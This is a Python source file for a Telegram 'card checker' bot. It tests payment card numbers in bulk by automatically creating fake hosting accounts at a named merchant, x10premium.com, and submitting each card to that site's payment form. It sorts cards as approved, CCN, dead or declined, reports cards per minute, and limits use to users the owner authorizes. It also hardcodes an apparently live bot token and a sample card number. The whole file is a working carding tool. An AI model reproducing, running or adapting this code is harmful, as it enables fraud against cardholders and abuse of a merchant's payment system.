import asyncio
import time
import requests
from bs4 import BeautifulSoup
from io import BytesIO
from typing import Dict, Optional, Callable
import random
import string
import json
import os

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
)

# Configuration
BOT_TOKEN = "8466659336:AAGYhLVN7HOKzcb-2f_mEZNSZOiw9tlmFEs"
OWNER_ID = 8226656006  # Owner's Telegram ID

# File to store authorized users
AUTHORIZED_FILE = "authorized_users.json"

# User states for mass checking
user_states: Dict[int, Dict] = {}


def load_authorized_users():
    """Load authorized users from file"""
    if os.path.exists(AUTHORIZED_FILE):
        try:
            with open(AUTHORIZED_FILE, 'r') as f:
                return set(json.load(f))
        except:
            return {OWNER_ID}
    return {OWNER_ID}


def save_authorized_users(users):
    """Save authorized users to file"""
    with open(AUTHORIZED_FILE, 'w') as f:
        json.dump(list(users), f)


# Load authorized users on startup
authorized_users = load_authorized_users()


def is_authorized(user_id: int) -> bool:
    """Check if user is authorized"""
    return user_id in authorized_users


def is_owner(user_id: int) -> bool:
    """Check if user is owner"""
    return user_id == OWNER_ID


def generate_random_data():
    """Generate random data instantly"""
    random_first = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
    random_last = ''.join(random.choices(string.ascii_lowercase, k=7)).capitalize()
    random_city = ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize()
    random_state = ''.join(random.choices(string.ascii_uppercase, k=2))
    random_zip = ''.join(random.choices(string.digits, k=5))
    random_phone = ''.join(random.choices(string.digits, k=10))
    random_address = ''.join(random.choices(string.digits, k=4)) + ' ' + ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize() + ' St'

    return {
        'firstname': random_first,
        'lastname': random_last,
        'fullname': f"{random_first} {random_last}",
        'address': random_address,
        'city': random_city,
        'state': random_state,
        'zip': random_zip,
        'country': 'US',
        'phone': random_phone
    }


def generate_random_email():
    """Generate a random email address"""
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domains = ['outlook.com', 'gmail.com', 'yahoo.com', 'hotmail.com']
    return f"{random_str}@{random.choice(domains)}"


def generate_random_subdomain():
    """Generate a random subdomain"""
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return random_str


def parse_card_input(card_string, cardholder_name):
    """Parse card input format: cardnum|month|year|cvv"""
    parts = card_string.split('|')

    if len(parts) != 4:
        raise ValueError("Invalid format. Use: cardnum|month|year|cvv")

    cardnum, month, year, cvv = parts

    cardnum_formatted = ' '.join([cardnum[i:i+4] for i in range(0, len(cardnum), 4)])

    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Invalid year format")

    exp_formatted = f"{month.zfill(2)} / {year}"

    return {
        'cardnum': cardnum_formatted,
        'exp': exp_formatted,
        'cvc': cvv,
        'name': cardholder_name,
        'raw': card_string
    }


def get_bin_info(bin_number):
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            brand = data.get('brand', 'Unknown Brand')
            type_ = data.get('type', 'Unknown Type')
            country = data.get('country', {}).get('name', 'Unknown Country')
            return f"{bank} - {brand.upper()} - {type_.upper()} - {country}"
        return "BIN lookup failed"
    except:
        return "BIN lookup unavailable"


def create_account_and_check_card(card_string):
    """Create account AND check card"""
    session = requests.Session()

    email = generate_random_email()
    subdomain = generate_random_subdomain()
    password = "beboy123"

    addr = generate_random_data()

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "pragma": "no-cache",
        "sec-ch-ua": '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    }

    try:
        initial_page = session.get("https://x10premium.com/order", headers=headers, timeout=10)
        soup = BeautifulSoup(initial_page.content, 'html.parser')

        hidden_tokens = {}
        for hidden_input in soup.find_all('input', type='hidden'):
            name = hidden_input.get('name')
            value = hidden_input.get('value', '')
            if name:
                hidden_tokens[name] = value
    except Exception:
        return None

    data1 = {
        "package": "infinityplusone",
        "migration": "",
        "order-submit": "true",
        "serviceorder": "",
        "term": "monthly",
        "domain": "subdomain",
        "secret": "",
        "domainstr": subdomain,
        "tld": ".com",
        "sld": "x10.mx",
        "ipaddress": "",
        "ssl": "",
        "migration-user": "",
        "emailaddress": email,
        "password": password,
        "firstname": addr['firstname'],
        "lastname": addr['lastname'],
        "company": "",
        "address1": addr['address'],
        "address2": "",
        "city": addr['city'],
        "state": addr['state'],
        "postalcode": addr['zip'],
        "country": addr['country'],
        "idd": "+1",
        "phonenumber": addr['phone'],
        "confirmorder": "Please wait.."
    }
    data1.update(hidden_tokens)

    try:
        session.post("https://x10premium.com/order", data=data1, headers=headers, allow_redirects=True, timeout=10)
    except Exception:
        return None

    time.sleep(1)

    data2 = {
        "package": "infinityplusone",
        "domain": "subdomain",
        "order-submit": "true",
        "term": "monthly",
        "secret": "",
        "domainstr": subdomain,
        "tld": ".com",
        "sld": "x10.mx",
        "ipaddress": "",
        "ssl": "",
        "migration": "",
        "migration-user": "",
        "firstname": addr['firstname'],
        "lastname": addr['lastname'],
        "emailaddress": email,
        "password": password,
        "company": "",
        "address1": addr['address'],
        "address2": "",
        "postalcode": addr['zip'],
        "city": addr['city'],
        "state": addr['state'],
        "country": addr['country'],
        "phonenumber": addr['phone'],
        "idd": "+1",
        "completeorder": "Please wait.."
    }
    data2.update(hidden_tokens)

    try:
        session.post("https://x10premium.com/order", data=data2, headers=headers, allow_redirects=False, timeout=10)
    except Exception:
        return None

    time.sleep(1)

    try:
        login_page = session.get("https://clients.x10premium.com/login", headers=headers, timeout=10)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'seasurf'})

        if not csrf_input:
            return None

        csrf_token = csrf_input.get('value', '')

        login_data = {
            "seasurf": csrf_token,
            "do_signin": "true",
            "email": email,
            "password": password
        }

        session.post(
            "https://clients.x10premium.com/do-sign-in",
            data=login_data,
            headers=headers,
            allow_redirects=True,
            timeout=10
        )

        card_page = session.get("https://clients.x10premium.com/payment/card", headers=headers, timeout=10)

        if 'login' in card_page.url:
            return None

        soup = BeautifulSoup(card_page.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'seasurf'})

        if not csrf_input:
            return None

        card_csrf_token = csrf_input.get('value', '')

    except Exception:
        return None

    start_time = time.time()

    try:
        card_data = parse_card_input(card_string, addr['fullname'])

        form_data = {
            "seasurf": card_csrf_token,
            "cardnum": card_data['cardnum'],
            "exp": card_data['exp'],
            "name": card_data['name'],
            "cvc": card_data['cvc'],
            "save": "Save Card"
        }

        response = session.post(
            "https://clients.x10premium.com/payment/do_card",
            headers=headers,
            data=form_data,
            allow_redirects=True,
            timeout=10
        )

    except Exception:
        return None

    elapsed = round(time.time() - start_time, 2)
    response_text = response.text

    if 'login' in response.url:
        return {'status': 'SESSION_EXPIRED', 'time': elapsed, 'card': card_string}

    # Extract message from response
    soup = BeautifulSoup(response_text, 'html.parser')
    notice_div = soup.find('div', class_='notice')
    
    if notice_div:
        message_span = notice_div.find('span')
        if message_span:
            message = message_span.get_text(strip=True)
        else:
            message = notice_div.get_text(strip=True)
    else:
        # Check in plain text
        if 'successfully added your' in response_text.lower() or 'card has been saved' in response_text.lower():
            message = "Card successfully added."
        else:
            message = "Unknown response"
    
    # Exact message matching as specified
    if message == "Card successfully added.":
        return {'status': 'APPROVED', 'message': message, 'time': elapsed, 'card': card_string, 'cardholder': addr['fullname']}
    elif message == "The provided card security code appears to be invalid. The authorization was declined by your card issuer or bank.":
        return {'status': 'DEAD', 'message': message, 'time': elapsed, 'card': card_string, 'cardholder': addr['fullname']}
    elif message == "The authorization was declined by your card issuer or bank.":
        return {'status': 'DECLINED', 'message': message, 'time': elapsed, 'card': card_string, 'cardholder': addr['fullname']}
    elif message == "The provided card security code appears to be invalid.":
        return {'status': 'CCN', 'message': message, 'time': elapsed, 'card': card_string, 'cardholder': addr['fullname']}
    else:
        return {'status': 'UNKNOWN', 'message': message, 'time': elapsed, 'card': card_string, 'cardholder': addr['fullname']}


def get_progress_bar(current: int, total: int = 100, width: int = 10) -> str:
    if total == 0:
        percent = 0
    else:
        percent = min(100, max(0, int((current / total) * 100)))
    filled = int(percent / 10)
    filled = min(filled, width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}] {percent}%"


def format_single_progress(percent: int, step: str) -> str:
    bar = get_progress_bar(percent)
    return (
        f"🔄 Checking via Payapl CVV 💳\n\n"
        f"━━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━━\n"
        f" 𝑺𝒕𝒆𝒑: {step}\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {bar}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


def format_progress_stats(current: int, total: int, hits: int, ccn: int, dead: int, declined: int, errors: int,
                          cpm: float, avg_time: float, retries: int, current_card: str = None) -> str:
    progress_bar = get_progress_bar(current, total)
    status_emoji = "🔄" if current < total else "✅"
    
    current_line = f"📝 Current: {current_card[:6]}****{current_card.split('|')[-1] if '|' in current_card else ''}..." if current_card else f"📝 Processing card {current}/{total}..."
    
    return (
        f"{status_emoji} 𝑺𝒕𝒂𝒕𝒖𝒔:  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 💳\n\n"
        f"━━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━━\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {current}/{total} {progress_bar}\n"
        f" 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅: {hits} ✅\n"
        f" 𝑪𝑪𝑵: {ccn} 💳\n"
        f" 𝑫𝒆𝒂𝒅: {dead} 💀\n"
        f" 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅: {declined} ❌\n"
        f" 𝑬𝒓𝒓𝒐𝒓𝒔: {errors} ⚠️\n"
        f"{current_line}\n"
        f"━━━━━━━━ 𝑷𝑬𝑹𝑭𝑶𝑹𝑴𝑨𝑵𝑪𝑬 ━━━━━━━━\n"
        f" 𝑪𝑷𝑴: {cpm:.1f} cards/min 🚀\n"
        f" 𝑨𝒗𝒈 𝑻𝒊𝒎𝒆: {avg_time:.2f}s ⏱️\n"
        f" 𝑹𝒆𝒕𝒓𝒊𝒆𝒔: {retries} 🔄\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


def process_output(result, card_string):
    if not result:
        return f"❌ Error checking {card_string}: Failed to process"
    
    status = result['status']
    elapsed = result['time']
    card = result['card']
    message = result.get('message', 'No message')
    
    bin_number = card.split('|')[0][:6]
    bin_info = get_bin_info(bin_number)
    
    if status == 'APPROVED':
        emoji = "✅"
        status_text = "APPROVED"
        detail_text = "Card: ✅ | CVV: ✅"
    elif status == 'CCN':
        emoji = "💳"
        status_text = "CCN"
        detail_text = "Card: 💳 | CVV: ❌"
    elif status == 'DEAD':
        emoji = "💀"
        status_text = "DEAD"
        detail_text = "Card: 💀 | CVV: 💀"
    elif status == 'DECLINED':
        emoji = "❌"
        status_text = "DECLINED"
        detail_text = "Card: ❌ | CVV: ❌"
    else:
        emoji = "⚠️"
        status_text = "UNKNOWN"
        detail_text = "Status unclear"
    
    response_text = (
        f"{emoji} {status_text}\n\n"
        f"𝑺𝒕𝒂𝒕𝒖𝒔:  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ✅\n"
        f"━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: [██████████] 100%\n\n"
        f"💳 Card: {card}\n"
        f"📋 {detail_text}\n"
        f"💬 Message: {message}\n"
        f"🏦 BIN Info: {bin_info}\n"
        f"🌐 Gateway: Paypal CVV\n"
        f"⏱️  Time: {elapsed}s"
    )
    return response_text


async def process_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id not in user_states:
        await context.bot.send_message(chat_id=chat_id, text="❌ No pending mass check. Use /cvvmass first.")
        return
    
    state = user_states[user_id]
    file = state['file']
    lines = [line.strip() for line in file.getvalue().decode('utf-8').splitlines() if line.strip()]
    total = len(lines)
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ Empty file or no valid lines.")
        del user_states[user_id]
        return
    
    state['total_lines'] = total
    state['start_time'] = time.time()
    state['processed'] = 0
    state['hits'] = 0
    state['ccn'] = 0
    state['dead'] = 0
    state['declined'] = 0
    state['errors'] = 0
    state['times'] = []
    state['retries'] = 0
    state['individual_results'] = []
    
    initial_text = format_progress_stats(0, total, 0, 0, 0, 0, 0, 0.0, 0.0, 0)
    progress_msg = await context.bot.send_message(chat_id=chat_id, text=initial_text)
    state['progress_msg_id'] = progress_msg.message_id
    
    for i, card in enumerate(lines, 1):
        try:
            current_display = f"{card[:6]}****|{card.split('|')[1] if '|' in card else ''}|{card.split('|')[2][-2:] if '|' in card else ''}|***"
            total_time = time.time() - state['start_time']
            avg_time = sum(state['times']) / len(state['times']) if state['times'] else 0
            cpm = (state['processed'] / total_time * 60) if total_time > 0 else 0
            pre_text = format_progress_stats(i, total, state['hits'], state['ccn'], state['dead'], state['declined'], state['errors'], cpm, avg_time, state['retries'], current_display)
            await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text=pre_text)
            
            start_card_time = time.time()
            result = create_account_and_check_card(card)
            elapsed = round(time.time() - start_card_time, 2)
            
            if result:
                output = process_output(result, card)
                status = result['status']
                
                if status == 'APPROVED':
                    state['hits'] += 1
                elif status == 'CCN':
                    state['ccn'] += 1
                elif status == 'DEAD':
                    state['dead'] += 1
                elif status == 'DECLINED':
                    state['declined'] += 1
                else:
                    state['errors'] += 1
            else:
                state['errors'] += 1
                output = f"❌ Error checking {card}: Failed"
                elapsed = 0.5
            
            state['individual_results'].append(output)
            state['times'].append(elapsed)
            state['processed'] = i
            
            total_time = time.time() - state['start_time']
            avg_time = sum(state['times']) / len(state['times']) if state['times'] else 0
            cpm = (i / total_time * 60) if total_time > 0 else 0
            post_text = format_progress_stats(i, total, state['hits'], state['ccn'], state['dead'], state['declined'], state['errors'], cpm, avg_time, state['retries'])
            await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text=post_text)
            await asyncio.sleep(0.5)
        
        except asyncio.CancelledError:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text="❌ Mass check cancelled.")
            del user_states[user_id]
            raise
        except Exception as e:
            state['errors'] += 1
            state['individual_results'].append(f"❌ Error on {card}: {str(e)}")
            state['processed'] = i
            state['retries'] += 1
    
    total_time = time.time() - state['start_time']
    avg_time = sum(state['times']) / len(state['times']) if state['times'] else 0
    cpm = (total / total_time * 60) if total_time > 0 else 0
    final_text = format_progress_stats(total, total, state['hits'], state['ccn'], state['dead'], state['declined'], state['errors'], cpm, avg_time, state['retries'])
    final_text += f"\n\n🎉 Mass check complete! 🚀 Total: {total} | Approved: {state['hits']} | CCN: {state['ccn']} | Dead: {state['dead']} | Declined: {state['declined']} | Errors: {state['errors']}"
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text=final_text)
    
    results_text = "\n\n--- Individual Results (Batch 1/...) ---\n\n"
    batch_size = 5
    for j in range(0, len(state['individual_results']), batch_size):
        batch = state['individual_results'][j:j+batch_size]
        batch_text = "\n\n".join(batch)
        if len(results_text + batch_text) > 4000:
            await context.bot.send_message(chat_id=chat_id, text=results_text)
            results_text = f"\n\n--- Individual Results (Batch {j//batch_size + 2}/...) ---\n\n{batch_text}"
        else:
            results_text += batch_text
    
    if results_text.strip():
        await context.bot.send_message(chat_id=chat_id, text=results_text)
    
    del user_states[user_id]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    await update.message.reply_text(
        "💳 Welcome to CIBEBE🎪 Card Checker Bot!\n\n"
        "Commands:\n"
        "/cvv <card> - Single check (format: card|MM|YY|CVV or card|MM|YYYY|CVV)\n"
        "/cvvmass - Start mass check (send file after) 🔄\n\n"
        "Example: /cvv 4154644406585084|01|31|552\n\n"
        "For mass: Use /cvvmass then send your .txt file with one card per line. Watch the real-time progress! 📊"
    )


async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only the owner can add users.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /add <telegram_id>\nExample: /add 123456789")
        return
    
    try:
        new_user_id = int(context.args[0])
        authorized_users.add(new_user_id)
        save_authorized_users(authorized_users)
        await update.message.reply_text(f"✅ User {new_user_id} has been authorized!")
    except ValueError:
        await update.message.reply_text("❌ Invalid Telegram ID. Must be a number.")


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only the owner can remove users.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /remove <telegram_id>\nExample: /remove 123456789")
        return
    
    try:
        remove_user_id = int(context.args[0])
        if remove_user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot remove the owner!")
            return
        
        if remove_user_id in authorized_users:
            authorized_users.remove(remove_user_id)
            save_authorized_users(authorized_users)
            await update.message.reply_text(f"✅ User {remove_user_id} has been removed!")
        else:
            await update.message.reply_text(f"❌ User {remove_user_id} is not in the authorized list.")
    except ValueError:
        await update.message.reply_text("❌ Invalid Telegram ID. Must be a number.")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only the owner can view the user list.")
        return
    
    if len(authorized_users) == 0:
        await update.message.reply_text("📋 No authorized users.")
        return
    
    user_list = "\n".join([f"- {uid} {'(Owner)' if uid == OWNER_ID else ''}" for uid in authorized_users])
    await update.message.reply_text(f"📋 Authorized Users:\n\n{user_list}\n\nTotal: {len(authorized_users)}")


async def cvv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /cvv card|MM|YY|CVV")
        return
    
    card = " ".join(context.args)
    chat_id = update.effective_chat.id
    
    msg = await update.message.reply_text(format_single_progress(0, "Initializing"))
    
    async def update_prog(percent: int, step: str):
        text = format_single_progress(percent, step)
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=text)
    
    await update_prog(25, "Creating account")
    await asyncio.sleep(0.5)
    await update_prog(50, "Logging in")
    await asyncio.sleep(0.5)
    await update_prog(75, "Submitting card")
    
    result = await asyncio.to_thread(create_account_and_check_card, card)
    
    if result:
        output = process_output(result, card)
    else:
        output = f"❌ Error checking {card}: Failed to process"
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=output)


async def cvvmass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    user_states[user_id] = {}
    await update.message.reply_text("📤 Please send the .txt file for mass check. Each line: card|MM|YY|CVV\n\nReal-time progress will update as it processes! 🚀")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if user_id not in user_states:
        await update.message.reply_text("❌ Send a file after /cvvmass command.")
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = BytesIO()
    await file.download_to_memory(file_content)
    user_states[user_id]['file'] = file_content
    
    await update.message.reply_text(f"🚀 Starting mass check... Real-time updates incoming! 📊")
    asyncio.create_task(process_mass_check(update, context))


def main():
    """Start the bot"""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("list", list_users))
    application.add_handler(CommandHandler("cvv", cvv))
    application.add_handler(CommandHandler("cvvmass", cvvmass))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🤖 Starting CIBEBE Card Checker Bot...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"📋 Authorized users: {len(authorized_users)}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
